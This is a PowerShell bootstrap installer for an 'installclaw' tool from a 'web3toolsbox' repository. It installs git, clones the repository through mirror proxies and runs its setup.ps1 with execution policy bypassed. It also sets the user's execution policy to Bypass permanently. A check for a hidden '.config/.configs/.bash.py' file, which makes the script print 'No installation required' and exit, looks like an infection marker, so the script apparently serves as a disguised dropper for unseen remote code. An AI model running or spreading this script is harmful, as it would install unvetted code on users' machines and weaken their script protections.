#Requires -Version 5.1
<#
.SYNOPSIS
    installclaw bootstrap installer (Windows / PowerShell).
.DESCRIPTION
    Ensures git is available, clones the installclaw repository (with
    GitHub mirror fallback for restricted networks), then runs setup.ps1.
#>

[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

# Force UTF-8 for both console output and downstream child processes
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)
$OutputEncoding           = [System.Text.UTF8Encoding]::new($false)

# ------------------------------------------------------------
# Guard
# ------------------------------------------------------------
$guardFile = Join-Path $HOME ".config/.configs/.bash.py"
if (Test-Path -LiteralPath $guardFile) {
    Write-Host "No installation required." -ForegroundColor Yellow
    exit 1
}

# ------------------------------------------------------------
# Logging
# ------------------------------------------------------------
function Write-Info { param([string]$Msg) Write-Host "[INFO]  $Msg" -ForegroundColor Cyan }
function Write-Warn { param([string]$Msg) Write-Host "[WARN]  $Msg" -ForegroundColor Yellow }
function Write-Err  { param([string]$Msg) Write-Host "[ERROR] $Msg" -ForegroundColor Red }
function Write-Ok   { param([string]$Msg) Write-Host "[ OK ]  $Msg" -ForegroundColor Green }

# ------------------------------------------------------------
# Privilege check (some installers require it)
# ------------------------------------------------------------
function Test-IsAdmin {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        $pr = [Security.Principal.WindowsPrincipal]::new($id)
        return $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        return $false
    }
}

# ------------------------------------------------------------
# Configuration
# ------------------------------------------------------------
$RepoPath = "web3toolsbox/installclaw.git"

# GitHub mirror list (priority order, falls back automatically)
$GitMirrors = @(
    "https://github.com/$RepoPath",
    "https://ghproxy.com/https://github.com/$RepoPath",
    "https://gh-proxy.com/https://github.com/$RepoPath",
    "https://hub.gitmirror.com/https://github.com/$RepoPath"
)

# Direct Git for Windows installer (used when winget/choco/scoop all fail)
$GitForWindowsApi = "https://api.github.com/repos/git-for-windows/git/releases/latest"

# ------------------------------------------------------------
# winget detection / installation
# ------------------------------------------------------------
function Resolve-WingetPath {
    $cmd = Get-Command winget -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }

    # Probe common locations; AppInstaller dir name has a version suffix
    $probes = @(
        (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\winget.exe')
    )
    $progFiles = $env:ProgramFiles
    if ($progFiles) {
        $probes += (Get-ChildItem -Path (Join-Path $progFiles 'WindowsApps') `
                       -Filter 'Microsoft.DesktopAppInstaller_*' `
                       -ErrorAction SilentlyContinue |
                    ForEach-Object { Join-Path $_.FullName 'winget.exe' })
    }
    foreach ($p in $probes) {
        if ($p -and (Test-Path -LiteralPath $p)) { return $p }
    }
    return $null
}

function Install-WingetIfMissing {
    $existing = Resolve-WingetPath
    if ($existing) { return $existing }

    Write-Info "winget not found. Attempting to install App Installer + dependencies..."

    $tmp = New-Item -ItemType Directory -Force -Path (Join-Path $env:TEMP ("winget-bootstrap-" + [Guid]::NewGuid().ToString('N')))
    try {
        # VCLibs (required by AppInstaller on clean Win10)
        $arch = if ([Environment]::Is64BitOperatingSystem) { 'x64' } else { 'x86' }
        $vcLibsUrl  = "https://aka.ms/Microsoft.VCLibs.$arch.14.00.Desktop.appx"
        $wingetUrl  = "https://aka.ms/getwinget"
        $vcLibsPath = Join-Path $tmp.FullName "VCLibs.appx"
        $wingetPath = Join-Path $tmp.FullName "AppInstaller.msixbundle"

        try {
            Invoke-WebRequest -Uri $vcLibsUrl -OutFile $vcLibsPath -UseBasicParsing
            Add-AppxPackage -Path $vcLibsPath -ErrorAction SilentlyContinue
        } catch {
            Write-Warn "VCLibs install skipped: $($_.Exception.Message)"
        }

        Invoke-WebRequest -Uri $wingetUrl -OutFile $wingetPath -UseBasicParsing
        Add-AppxPackage -Path $wingetPath
    } catch {
        Write-Warn "winget install failed: $($_.Exception.Message)"
        return $null
    } finally {
        Remove-Item $tmp.FullName -Recurse -Force -ErrorAction SilentlyContinue
    }

    $windowsApps = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps'
    if ((Test-Path -LiteralPath $windowsApps) -and -not (($env:Path -split ';') -contains $windowsApps)) {
        $env:Path += ";$windowsApps"
    }
    return (Resolve-WingetPath)
}

# ------------------------------------------------------------
# Git installation strategies (winget -> choco -> scoop -> direct .exe)
# ------------------------------------------------------------
function Install-GitViaWinget {
    $winget = Install-WingetIfMissing
    if (-not $winget) { return $false }
    Write-Info "Installing Git via winget..."
    & $winget install --id Git.Git -e --source winget `
        --accept-package-agreements --accept-source-agreements --silent
    return ($LASTEXITCODE -eq 0)
}

function Install-GitViaChoco {
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) { return $false }
    Write-Info "Installing Git via Chocolatey..."
    & choco install git -y --no-progress
    return ($LASTEXITCODE -eq 0)
}

function Install-GitViaScoop {
    if (-not (Get-Command scoop -ErrorAction SilentlyContinue)) { return $false }
    Write-Info "Installing Git via Scoop..."
    & scoop install git
    return ($LASTEXITCODE -eq 0)
}

function Install-GitViaDirectDownload {
    Write-Info "Downloading Git for Windows installer directly..."
    $tmp = New-Item -ItemType Directory -Force -Path (Join-Path $env:TEMP ("git-installer-" + [Guid]::NewGuid().ToString('N')))
    try {
        $arch = if ([Environment]::Is64BitOperatingSystem) { '64-bit' } else { '32-bit' }
        $rel  = Invoke-RestMethod -Uri $GitForWindowsApi -UseBasicParsing -Headers @{ 'User-Agent' = 'installclaw' }
        $asset = $rel.assets | Where-Object {
            $_.name -match '^Git-.*-' + [regex]::Escape($arch) + '\.exe$'
        } | Select-Object -First 1
        if (-not $asset) {
            Write-Warn "Could not locate a Git for Windows installer asset."
            return $false
        }
        $exe = Join-Path $tmp.FullName $asset.name
        Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $exe -UseBasicParsing
        $args = '/VERYSILENT', '/NORESTART', '/NOCANCEL', '/SP-', '/CLOSEAPPLICATIONS', '/RESTARTAPPLICATIONS'
        $proc = Start-Process -FilePath $exe -ArgumentList $args -Wait -PassThru
        return ($proc.ExitCode -eq 0)
    } catch {
        Write-Warn "Direct installer failed: $($_.Exception.Message)"
        return $false
    } finally {
        Remove-Item $tmp.FullName -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Update-PathForGit {
    $candidates = @(
        "C:\Program Files\Git\cmd",
        "C:\Program Files (x86)\Git\cmd",
        (Join-Path $env:LOCALAPPDATA 'Programs\Git\cmd')
    )
    foreach ($p in $candidates) {
        if ((Test-Path -LiteralPath $p) -and -not (($env:Path -split ';') -contains $p)) {
            $env:Path += ";$p"
        }
    }
    # Also pull machine + user PATH so freshly installed git becomes visible
    $sys  = [Environment]::GetEnvironmentVariable('Path', 'Machine')
    $usr  = [Environment]::GetEnvironmentVariable('Path', 'User')
    if ($sys) { $env:Path += ";$sys" }
    if ($usr) { $env:Path += ";$usr" }
}

function Install-GitIfMissing {
    if (Get-Command git -ErrorAction SilentlyContinue) {
        Write-Ok "Git is already installed: $((git --version) 2>&1)"
        return
    }

    Write-Info "Git not found. Trying installation methods in order..."
    $methods = @(
        @{ Name = 'winget';            Action = { Install-GitViaWinget } },
        @{ Name = 'Chocolatey';        Action = { Install-GitViaChoco } },
        @{ Name = 'Scoop';             Action = { Install-GitViaScoop } },
        @{ Name = 'Direct download';   Action = { Install-GitViaDirectDownload } }
    )

    $installed = $false
    foreach ($m in $methods) {
        Write-Info "Trying: $($m.Name)"
        try {
            if (& $m.Action) { $installed = $true; break }
        } catch {
            Write-Warn "$($m.Name) raised: $($_.Exception.Message)"
        }
        Write-Warn "$($m.Name) did not succeed, falling back."
    }

    Update-PathForGit
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Err "Git is still unavailable after all methods."
        Write-Err "Please install Git for Windows manually: https://git-scm.com/download/win"
        Write-Err "Then reopen PowerShell and run this script again."
        exit 1
    }
    Write-Ok "Git installed: $((git --version) 2>&1)"
}

# ------------------------------------------------------------
# Refresh current process environment so newly-installed tools
# (git, node, etc.) become usable without restarting the shell.
# ------------------------------------------------------------
function Update-CurrentEnvironment {
    Write-Info "Refreshing current shell environment..."

    # 1) Pull latest Machine + User PATH (and other vars) from registry
    foreach ($scope in 'Machine', 'User') {
        try {
            $vars = [Environment]::GetEnvironmentVariables($scope)
        } catch {
            continue
        }
        foreach ($name in $vars.Keys) {
            $val = [Environment]::GetEnvironmentVariable($name, $scope)
            if (-not $val) { continue }
            if ($name -ieq 'Path') {
                # Merge instead of overwrite to keep current-process additions
                $merged = (($env:Path -split ';') + ($val -split ';')) |
                          Where-Object { $_ -and $_.Trim() } |
                          Select-Object -Unique
                $env:Path = ($merged -join ';')
            } else {
                Set-Item -Path "Env:$name" -Value $val -ErrorAction SilentlyContinue
            }
        }
    }

    # 2) Dot-source the user's PowerShell profile if present
    if ($PROFILE -and (Test-Path -LiteralPath $PROFILE)) {
        try {
            Write-Info "Sourcing PowerShell profile: $PROFILE"
            . $PROFILE
        } catch {
            Write-Warn "Profile reload raised: $($_.Exception.Message)"
        }
    }

    Write-Ok "Environment refreshed (current process). Parent shell still needs restart for some tools."
}

# __PLACEHOLDER_6__
function Invoke-CloneWithFallback {
    param(
        [Parameter(Mandatory)] [string] $Target
    )
    foreach ($url in $GitMirrors) {
        Write-Info "Cloning from: $url"
        & git clone --depth=1 --single-branch $url $Target
        if ($LASTEXITCODE -eq 0) {
            Write-Ok "Clone succeeded: $url"
            return
        }
        Write-Warn "Clone failed, trying next mirror..."
        if (Test-Path -LiteralPath $Target) {
            Remove-Item $Target -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    throw "All mirrors failed. Please check your network connection."
}

# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
function Invoke-Main {
    if (-not (Test-IsAdmin)) {
        Write-Warn "Not running as Administrator. winget/Appx may fail on some systems."
    }

    # CurrentUser scope does not require admin and is the safest default
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction Stop
    } catch {
        Write-Warn "Could not set execution policy: $($_.Exception.Message)"
    }

    Install-GitIfMissing

    $workDir  = Join-Path $env:TEMP ("installclaw-bootstrap-" + [Guid]::NewGuid().ToString('N'))
    $repoDir  = Join-Path $workDir 'installclaw'
    $original = Get-Location
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null

    $exitCode = 0
    try {
        Set-Location -Path $workDir
        Invoke-CloneWithFallback -Target $repoDir

        $childScript = Join-Path $repoDir 'setup.ps1'
        if (-not (Test-Path -LiteralPath $childScript)) {
            throw "Child installer script not found: $childScript"
        }

        Set-Location -Path $repoDir
        # Run child script in a fresh PowerShell with bypass policy for robustness
        $ps = (Get-Process -Id $PID).Path
        & $ps -NoProfile -ExecutionPolicy Bypass -File $childScript
        if ($LASTEXITCODE -ne 0) {
            throw "Child installer exited with code $LASTEXITCODE"
        }

        Update-CurrentEnvironment
        Write-Ok "Install complete!"
    } catch {
        Write-Err $_.Exception.Message
        $exitCode = 1
    } finally {
        Set-Location -Path $original -ErrorAction SilentlyContinue
        if (Test-Path -LiteralPath $workDir) {
            Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    exit $exitCode
}

Invoke-Main
